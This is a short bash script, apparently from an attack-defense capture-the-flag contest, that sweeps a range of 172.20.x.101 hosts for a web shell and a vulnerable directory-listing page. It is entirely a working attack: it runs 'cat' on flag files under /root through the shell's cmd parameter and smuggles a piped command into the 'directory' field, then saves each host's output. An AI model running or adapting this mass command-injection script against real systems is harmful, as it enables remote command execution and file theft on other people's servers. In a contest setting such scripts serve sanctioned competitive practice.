#!/bin/bash

vuln1="0"
vuln2="0"
for i in `seq 101 200`
do
ip="172.20.$i.101"
echo "Attack $ip..."
a=`curl -m 1 -o /dev/null -s -w %{http_code} http://$ip/Webshell.php`
b=`curl -m 1 -o /dev/null -s -w %{http_code} http://$ip/DisplayDirectoryCtrl.php`
if [ "$a" -eq "200" ]
then
  echo "vuln1flag"
  curl -o $ip.'web1.txt' http://$ip/Webshell.php?cmd=cat%20../../../root/flag*;
  let vuln1++
fi
if [ "$b" -eq "200" ]
then
  echo "vuln2flag"
  curl -o $ip.'web2.txt' http://$ip/DisplayDirectoryCtrl.php?directory=0%7Ccat+..%2F..%2F..%2Froot%2Fflag*;
  let vuln2++
fi
done
echo "vuln1 get $vuln1 flag,vuln2 get $vuln2 flag"
